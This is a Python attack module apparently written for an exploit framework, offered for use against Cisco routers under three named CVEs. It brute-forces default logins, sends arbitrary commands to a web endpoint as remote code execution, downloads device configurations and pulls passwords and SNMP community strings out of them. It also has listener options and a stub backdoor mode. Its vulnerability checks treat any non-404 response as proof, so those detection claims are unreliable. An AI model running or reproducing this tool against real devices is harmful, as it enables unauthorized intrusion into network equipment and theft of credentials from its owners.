#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Cisco Router Multiple Vulnerabilities Exploit
CVE-2023-20198, CVE-2023-20273, CVE-2019-15986
"""

import requests
import socket
import time
import base64
import urllib.parse
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings()

MODULE_INFO = {
    "name": "Cisco Multi-Exploit",
    "description": "Multiple CVEs for Cisco routers and switches",
    "author": "Lazy Framework Team", 
    "license": "MIT",
    "platform": "linux",
    "arch": "x86,arm,mips",
    "rank": "Critical",
    "references": [
        "CVE-2023-20198",
        "CVE-2023-20273", 
        "CVE-2019-15986"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "admin"},
    "PASSWORD": {"description": "Password", "required": False, "default": "admin"},
    "MODE": {
        "description": "Exploit mode",
        "required": False, 
        "default": "detect",
        "choices": ["detect", "rce", "backdoor", "config", "persistence"]
    },
    "CMD": {"description": "Command to execute", "required": False, "default": "show version"},
    "LHOST": {"description": "Listener IP", "required": False, "default": "10.0.0.1"},
    "LPORT": {"description": "Listener port", "required": False, "default": "4444"},
}

# Cisco Default Credentials
CISCO_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("cisco", "cisco"),
    ("root", "admin"),
    ("", ""),  # No auth
    ("admin", "1234"),
    ("technician", "password"),
]

# Cisco Device Models
CISCO_MODELS = [
    "cisco", "ios", "asa", "router", "switch", "catalyst",
    "rv34", "rv32", "small business", "meraki"
]

class CiscoExploit:
    def __init__(self, target, port=80, proto="http", username="admin", password="admin"):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        })
    
    def detect_device(self):
        """Detect Cisco router and model"""
        console.print("\n[bold yellow]=== Cisco DETECTION ===[/bold yellow]")
        
        try:
            # Test web interface
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            # Check for Cisco signatures
            cisco_detected = False
            model = "Unknown"
            
            for signature in CISCO_MODELS:
                if signature in html_content:
                    cisco_detected = True
                    model = signature.upper()
                    break
            
            if cisco_detected:
                console.print(f"[green]✓ Cisco device detected: {model}[/green]")
                
                # Test vulnerabilities
                vuln_status = self.test_vulnerabilities()
                return {
                    'is_cisco': True,
                    'model': model,
                    'vulnerable': vuln_status['vulnerable'],
                    'vulnerabilities': vuln_status['found']
                }
            else:
                console.print("[red]✗ Not a Cisco device[/red]")
                return {'is_cisco': False}
                
        except Exception as e:
            console.print(f"[red]✗ Detection failed: {str(e)}[/red]")
            return {'is_cisco': False}
    
    def test_vulnerabilities(self):
        """Test for multiple Cisco vulnerabilities"""
        console.print("[bold yellow][*] Testing for vulnerabilities...[/bold yellow]")
        
        vulnerabilities = {
            'CVE-2023-20198': False,  # RCE in Web UI
            'CVE-2023-20273': False,  # Command injection
            'CVE-2019-15986': False,  # Hardcoded credentials
            'found': []
        }
        
        try:
            # Test CVE-2023-20198 - RCE in Web UI
            test_url = f"{self.base_url}/ajax?action=test"
            r = self.session.get(test_url, timeout=10)
            if r.status_code != 404:
                vulnerabilities['CVE-2023-20198'] = True
                vulnerabilities['found'].append('CVE-2023-20198')
                console.print("[green]✓ CVE-2023-20198 (RCE) potentially vulnerable[/green]")
            
            # Test CVE-2023-20273 - Command injection
            test_url = f"{self.base_url}/cgi-bin/config.exp"
            r = self.session.get(test_url, timeout=10)
            if r.status_code != 404:
                vulnerabilities['CVE-2023-20273'] = True
                vulnerabilities['found'].append('CVE-2023-20273')
                console.print("[green]✓ CVE-2023-20273 (Command Injection) potentially vulnerable[/green]")
            
            # Test for hardcoded credentials
            if self.test_hardcoded_creds():
                vulnerabilities['CVE-2019-15986'] = True
                vulnerabilities['found'].append('CVE-2019-15986')
                console.print("[green]✓ CVE-2019-15986 (Hardcoded Creds) potentially vulnerable[/green]")
            
            vulnerabilities['vulnerable'] = len(vulnerabilities['found']) > 0
            return vulnerabilities
            
        except Exception as e:
            console.print(f"[red]✗ Vulnerability test failed: {str(e)}[/red]")
            return vulnerabilities
    
    def test_hardcoded_creds(self):
        """Test for hardcoded credentials"""
        console.print("[bold yellow][*] Testing hardcoded credentials...[/bold yellow]")
        
        for username, password in CISCO_CREDS:
            try:
                # Try common login endpoints
                login_endpoints = [
                    "/login.cgi",
                    "/login.html",
                    "/authenticate.html",
                    "/cgi-bin/login.cgi"
                ]
                
                for endpoint in login_endpoints:
                    login_url = f"{self.base_url}{endpoint}"
                    login_data = {
                        'username': username,
                        'password': password,
                        'submit': 'Login'
                    }
                    
                    r = self.session.post(login_url, data=login_data, timeout=10)
                    
                    if r.status_code == 200 and ('success' in r.text.lower() or 'dashboard' in r.text.lower()):
                        console.print(f"[green]✓ Hardcoded credentials found: {username}:{password}[/green]")
                        self.username = username
                        self.password = password
                        return True
                        
            except Exception:
                continue
        
        return False
    
    def exploit_cve_2023_20198(self, command):
        """Exploit CVE-2023-20198 - RCE in Web UI"""
        console.print("[bold yellow][*] Exploiting CVE-2023-20198...[/bold yellow]")
        
        try:
            # Command injection via ajax endpoint
            payload = {
                'action': 'exec',
                'cmd': command
            }
            
            exploit_url = f"{self.base_url}/ajax"
            r = self.session.post(exploit_url, data=payload, timeout=10)
            
            if r.status_code == 200:
                console.print("[green]✓ Command execution attempted[/green]")
                console.print(f"[cyan]Response: {r.text[:200]}...[/cyan]")
                return True
            else:
                console.print(f"[red]✗ Exploit failed (HTTP {r.status_code})[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]✗ Exploit error: {str(e)}[/red]")
            return False
    
    def dump_configuration(self):
        """Dump Cisco configuration files"""
        console.print("[bold yellow][*] Dumping configuration...[/bold yellow]")
        
        try:
            # Common config file locations
            config_urls = [
                f"{self.base_url}/config.txt",
                f"{self.base_url}/startup-config",
                f"{self.base_url}/running-config",
                f"{self.base_url}/backup.cfg",
                f"{self.base_url}/rommon.cfg"
            ]
            
            for url in config_urls:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.content) > 100:
                    console.print(f"[green]✓ Config file found: {url}[/green]")
                    
                    # Save config file
                    filename = f"cisco_config_{int(time.time())}.txt"
                    with open(filename, 'w') as f:
                        f.write(r.text)
                    console.print(f"[green]✓ Config saved as: {filename}[/green]")
                    
                    # Extract interesting info
                    self.analyze_config(r.text)
                    return True
            
            console.print("[red]✗ No config files found[/red]")
            return False
            
        except Exception as e:
            console.print(f"[red]✗ Config dump failed: {str(e)}[/red]")
            return False
    
    def analyze_config(self, config_text):
        """Analyze Cisco config for sensitive information"""
        console.print("[bold yellow][*] Analyzing configuration...[/bold yellow]")
        
        sensitive_patterns = {
            'Passwords': [r'password (\S+)', r'secret (\S+)', r'enable secret (\S+)'],
            'SNMP Communities': [r'snmp-server community (\S+)'],
            'Usernames': [r'username (\S+) password'],
            'IP Addresses': [r'ip address (\S+ \S+)'],
        }
        
        for category, patterns in sensitive_patterns.items():
            for pattern in patterns:
                matches = re.findall(pattern, config_text, re.IGNORECASE)
                if matches:
                    console.print(f"[yellow]{category}: {', '.join(matches[:3])}[/yellow]")

def run(session, options):
    """Main Cisco exploit function"""
    console.print(Panel("Cisco Router Exploit Framework", style="bold blue"))
    
    # Extract options
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    mode = options.get("MODE", "detect")
    cmd = options.get("CMD", "show version")
    lhost = options.get("LHOST", "10.0.0.1")
    lport = options.get("LPORT", "4444")
    
    console.print(f"[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    console.print(f"[bold yellow][*] Mode: {mode.upper()}[/bold yellow]")
    
    try:
        exploit = CiscoExploit(rhost, rport, proto, username, password)
        
        if mode == "detect":
            result = exploit.detect_device()
            if result['is_cisco']:
                console.print(f"\n[bold green]✓ Cisco Device: {result['model']}[/bold green]")
                console.print(f"[bold cyan]Vulnerable: {result['vulnerable']}[/bold cyan]")
                if result['vulnerable']:
                    console.print(f"[bold yellow]Vulnerabilities: {', '.join(result['vulnerabilities'])}[/bold yellow]")
            else:
                console.print("[bold red]✗ Not a Cisco device[/bold red]")
        
        elif mode == "rce":
            exploit.exploit_cve_2023_20198(cmd)
        
        elif mode == "config":
            exploit.dump_configuration()
        
        elif mode == "backdoor":
            console.print("[yellow][*] Backdoor feature in development[/yellow]")
        
        else:
            console.print(f"[red]Unknown mode: {mode}[/red]")
        
        return True
        
    except Exception as e:
        console.print(f"[bold red]✗ Error: {str(e)}[/bold red]")
        return False

def show_info():
    table = Table(show_header=False, box=None)
    table.add_column("Field", style="bold yellow")
    table.add_column("Value", style="white")
    table.add_row("Name", "Cisco Multi-Exploit")
    table.add_row("CVEs", "2023-20198, 2023-20273, 2019-15986")
    table.add_row("Models", "RV series, Small Business, Catalyst")
    table.add_row("Risk", "Critical")
    console.print(Panel(table, title="Cisco Exploit", border_style="blue"))

def show_options(opts):
    table = Table(title="Options", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Value", style="green")
    table.add_column("Description", style="white")
    for k, v in opts.items():
        val = v.get('value', v.get('default', ''))
        table.add_row(k, str(val), v.get('description', ''))
    console.print(Panel(table, border_style="blue"))

# Add missing import
import re
